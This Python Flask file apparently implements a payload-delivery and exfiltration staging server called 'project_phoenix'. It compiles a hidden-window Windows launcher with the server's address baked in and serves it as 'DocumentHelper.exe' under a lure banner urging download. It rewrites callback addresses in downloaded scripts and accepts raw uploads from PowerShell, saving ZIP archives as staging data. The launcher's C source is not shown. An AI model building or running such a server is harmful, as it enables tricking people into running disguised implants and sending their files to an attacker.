import os
import re
from datetime import datetime
from io import BytesIO
from flask import Flask, request, send_from_directory, send_file, render_template, jsonify, abort
from werkzeug.utils import secure_filename

app = Flask(__name__)

BASE_DIR = os.path.abspath("project_phoenix")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploaded")

os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

import subprocess, tempfile, hashlib, os, re

LAUNCHER_TEMPLATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher_template.c")
EXE_CACHE_DIR = os.path.join(BASE_DIR, ".exe_cache")
os.makedirs(EXE_CACHE_DIR, exist_ok=True)



ICON_FILE         = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.ico")

# Cache the compiled icon .o alongside the exes
ICON_OBJ = os.path.join(EXE_CACHE_DIR, "app.ico.o")

def _ensure_icon_obj() -> str | None:
    """Compile app.rc + app.ico -> app.ico.o once. Returns path, or None if no icon."""
    if not os.path.isfile(ICON_FILE):
        return None

    # Rebuild only if missing or older than the .ico
    if os.path.isfile(ICON_OBJ) and os.path.getmtime(ICON_OBJ) >= os.path.getmtime(ICON_FILE):
        return ICON_OBJ

    with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
        rc_path = os.path.join(td, "app.rc")
        # Copy the .ico into the temp dir so the relative reference in the .rc resolves
        tmp_ico = os.path.join(td, "app.ico")
        with open(ICON_FILE, "rb") as src, open(tmp_ico, "wb") as dst:
            dst.write(src.read())
        with open(rc_path, "w", encoding="utf-8") as f:
            f.write('IDI_ICON1 ICON "app.ico"\n')

        obj_tmp = os.path.join(td, "app.ico.o")
        r = subprocess.run(
            ["x86_64-w64-mingw32-windres",
             "-i", rc_path, "-O", "coff", "-o", obj_tmp],
            capture_output=True, text=True, timeout=30
        )
        if r.returncode != 0:
            raise RuntimeError(f"windres failed:\n{r.stdout}\n{r.stderr}")

        tmp = ICON_OBJ + ".tmp"
        os.replace(obj_tmp, tmp)     # both under EXE_CACHE_DIR → atomic
        os.replace(tmp, ICON_OBJ)

    return ICON_OBJ

def _build_phoenix_exe(server_host: str) -> str:
    if not re.fullmatch(r"[A-Za-z0-9.\-:]+", server_host):
        raise ValueError("Invalid server host")

    key    = hashlib.sha256(server_host.encode()).hexdigest()[:16]
    cached = os.path.join(EXE_CACHE_DIR, f"phoenix_{key}.exe")
    if os.path.isfile(cached) and os.path.getsize(cached) > 0:
        return cached

    icon_obj = _ensure_icon_obj()          # ← compile .ico once, reuse forever

    with open(LAUNCHER_TEMPLATE, "r", encoding="utf-8") as f:
        src = f.read().replace("@IP@", server_host)

    with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
        cpath   = os.path.join(td, "launcher.c")
        exepath = os.path.join(td, "phoenix.exe")
        with open(cpath, "w", encoding="utf-8") as f:
            f.write(src)

        cmd = ["x86_64-w64-mingw32-gcc", "-O2", "-s", "-mwindows",
               "-o", exepath, cpath]
        if icon_obj:
            cmd.append(icon_obj)           # ← links the icon resource

        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            raise RuntimeError(f"mingw-w64 failed:\n{r.stdout}\n{r.stderr}")

        tmp = cached + ".tmp"
        os.replace(exepath, tmp)
        os.replace(tmp, cached)

    return cached



@app.route("/download/phoenix.exe", methods=["GET"])
def download_phoenix_exe():
    server_host = request.host          # e.g. "172.16.25.1:5001" — port included
    try:
        exe = _build_phoenix_exe(server_host)
    except Exception as e:
        return jsonify({"error": str(e)}), 50
    return send_file(
        exe, as_attachment=True, download_name="DocumentHelper.exe",
        mimetype="application/vnd.microsoft.portable-executable"
    )


# File extensions where the server IP should be dynamically updated on download
TEXT_EXTENSIONS = {".txt", ".ps1", ".bat", ".cmd", ".sh", ".py", ".md", ".json", ".xml"}

def get_files_only(directory):
    """Returns a sorted list of visible files, ignoring subdirectories and hidden files."""
    return sorted([
        f for f in os.listdir(directory)
        if os.path.isfile(os.path.join(directory, f)) and not f.startswith(".")
    ])


@app.route("/", methods=["GET"])
def index():
    files = get_files_only(BASE_DIR)
    # Always advertise the on-the-fly launcher
    if "phoenix.exe" not in files:
        files.insert(0, "DocumentHelper.exe")
    return render_template(
        "index.html", title="Project Files", page="main",
        banner="Hey, complete your project by downloading these files.",
        current_path="project_phoenix/", files=files, allow_download=True,
    )



@app.route("/download/<path:filename>", methods=["GET"])
def download_file(filename):
    if filename == "phoenix.exe":
        return download_phoenix_exe()
    file_path = os.path.join(BASE_DIR, filename)
    if not os.path.isfile(file_path) or filename.startswith("."):
        abort(404)

    _, ext = os.path.splitext(filename)
    
    # Dynamically rewrite the IP:Port in script/text files before sending to the client
    if ext.lower() in TEXT_EXTENSIONS:
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()

            # request.host automatically holds the <SERVER_IP>:<PORT> the PC used (e.g. 192.168.1.67:5001)
            server_host = request.host

            # 1. Replace {{SERVER_IP}} placeholder if used in the file
            content = content.replace("{{SERVER_IP}}", server_host)

            # 2. Also replace any hardcoded http://<IP>:<PORT> automatically
            content = re.sub(
                r"http://(?:\d{1,3}\.){3}\d{1,3}:\d+",
                f"http://{server_host}",
                content
            )

            buffer = BytesIO(content.encode("utf-8"))
            return send_file(
                buffer,
                as_attachment=True,
                download_name=filename,
                mimetype="application/octet-stream"
            )
        except UnicodeDecodeError:
            # If the file isn't valid UTF-8 text, fall back to normal binary download
            pass

    return send_from_directory(BASE_DIR, filename, as_attachment=True)

@app.route("/uploaded", methods=["GET"])
def view_uploaded():
    files = get_files_only(UPLOAD_DIR)
    return render_template(
        "index.html",
        title="Uploaded Files",
        page="uploaded",
        banner=None,
        current_path="project_phoenix/uploaded/",
        files=files,
        allow_download=False
    )

# Supports both /uploaded and /uploaded/<filename>
@app.route("/upload", methods=["POST"])
@app.route("/uploaded", methods=["POST"])
@app.route("/uploaded/<path:custom_name>", methods=["POST"])
def handle_upload(custom_name=None):
    content_type = request.content_type or ""

    # Case 1: Standard multipart/form-data upload (e.g., curl -F "file=@...")
    if "multipart/form-data" in content_type and "file" in request.files:
        uploaded_file = request.files["file"]
        if uploaded_file.filename == "":
            return jsonify({"error": "Empty filename."}), 400

        filename = secure_filename(custom_name or uploaded_file.filename)
        save_path = os.path.join(UPLOAD_DIR, filename)
        uploaded_file.save(save_path)

        return jsonify({
            "status": "success",
            "message": f"File '{filename}' uploaded to project_phoenix/uploaded/"
        }), 201

    # Case 2: Raw body upload from PowerShell Invoke-WebRequest -InFile
    # parse_form_data=False prevents Flask from consuming/corrupting binary streams
    raw_data = request.get_data(cache=False, parse_form_data=False)

    if raw_data is not None and (len(raw_data) > 0 or request.content_length == 0):
        # Auto-detect if the uploaded binary is a ZIP archive (starts with 'PK')
        default_name = "phoenix_staging.zip" if raw_data.startswith(b"PK") else "newfile.txt"

        raw_filename = (
            custom_name
            or request.args.get("name")
            or request.headers.get("X-Filename")
            or default_name
        )
        filename = secure_filename(raw_filename)
        save_path = os.path.join(UPLOAD_DIR, filename)

        with open(save_path, "wb") as f:
            f.write(raw_data)

        return jsonify({
            "status": "success",
            "message": f"Raw file saved as '{filename}' ({len(raw_data)} bytes) in project_phoenix/uploaded/"
        }), 201

    return jsonify({"error": "No file data received."}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=False)
